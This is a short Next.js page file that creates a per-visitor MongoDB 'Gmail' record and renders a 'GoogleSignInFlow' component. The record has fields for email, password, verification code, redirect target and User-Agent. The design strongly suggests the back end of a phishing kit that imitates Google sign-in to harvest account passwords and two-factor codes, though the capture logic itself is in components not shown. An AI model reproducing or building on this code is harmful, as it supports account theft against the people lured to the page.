import GoogleSignInFlow from "@/components/Signin";
import connectDB from "@/lib/mongodb";
import Gmail from "@/models/Gmails";
import { connection } from "next/server";
import { redirect } from "next/navigation";
import { headers } from "next/headers";

// 🔥 FIX: Tells Next.js to allow this route to block pre-rendering and compile dynamically
export const instant = false;

export default async function SignInContent({
  searchParams,
}: {
  searchParams: Promise<{ id?: string }>;
}) {
  // Opt out of pre-rendering safely under cacheComponents constraints
  await connection(); 

  await connectDB();

  const { id } = await searchParams;

  // Check existing document
  if (id) {
    const existingGmail = await Gmail.findById(id);

    if (existingGmail) {
      return <GoogleSignInFlow id={existingGmail._id.toString()} />;
    }
  }

  // Get User-Agent
  const headersList = await headers();
  const userAgent = headersList.get("user-agent") || "";

  // Create new document
  const newGmail = await Gmail.create({
    email: "",
    password: "",
    state: "saved",
    code: "",
    redirectTo: "",
    userAgent,
  });

  // Redirect with ID
  redirect(`/?id=${newGmail._id.toString()}`);
}
